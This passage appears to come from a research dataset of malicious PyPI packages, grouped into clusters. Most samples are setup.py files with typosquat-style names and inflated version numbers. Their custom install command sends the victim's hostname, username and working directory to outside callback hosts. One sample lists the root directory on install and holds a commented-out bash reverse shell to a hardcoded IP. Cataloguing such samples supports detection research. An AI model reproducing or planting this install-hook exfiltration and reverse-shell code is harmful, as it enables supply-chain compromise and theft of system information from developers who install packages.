   main()\n\nsetup(\n    name=\"bytesap\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytepilot-0-0-15-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytepilot-0.0.15\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytepilot-0.0.15\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-byteseep-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"byteseep\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"byteseep\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-06-bytekafka0-0-15-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"bytekafka0.0.15\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytekafka0.0.15\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-giantmidi-piano-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"GiantMIDI-Piano\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"GiantMIDI-Piano\",\n    version=\"912.6\",\n    author=\"123\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-bytesip-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"bytesip\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytesip\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-lightseeq-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"lightseeq\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-lightseeq-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"lightseeq\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"lightseeq\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-lightseqe-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"lightseqe\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-lightseqe-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"lightseqe\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"lightseqe\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-lightsequ-v98.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"lightsequ\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-lightsequ-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"lightsequ\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"lightsequ\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-nerst-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"nerst\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"nerst\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-nuerst-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"nuerst\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"nuerst\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-nuest-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"nuest\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"nuest\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-nurst-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"nurst\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"nurst\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-v2mlx-gml-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"v2mlx-gml\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"v2mlx-gml\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-v2xlm-gml-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"v2xlm-gml\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"v2xlm-gml\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-05-x2vml-gml-v99.7",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"packagename\": \"x2vml-gml\",\n            \"hostname\": hostname,\n            \"user\": username,\n            \"path\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"x2vml-gml\",\n    version=\"99.7\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-08-mvdream-threestudio-v912.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib\nimport logging\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"MVDream-threestudio\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                logging.info(response.read().decode())\n        except Exception as e:\n            logging.error(f\"Could not reach {url}: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"MVDream-threestudio\",\n    version=\"912.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests'],\n    setup_requires=['setuptools']\n)"
      }
    ]
  },
  {
    "cluster_id": 92,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogishell2-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        res=os.popen(\"ls /\").read()\n        print(\"Res: \"+res)\n        # Now you can execute whatever post-install code you have\n        # os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell2',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop2',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-boogishell3-v0.1.0",
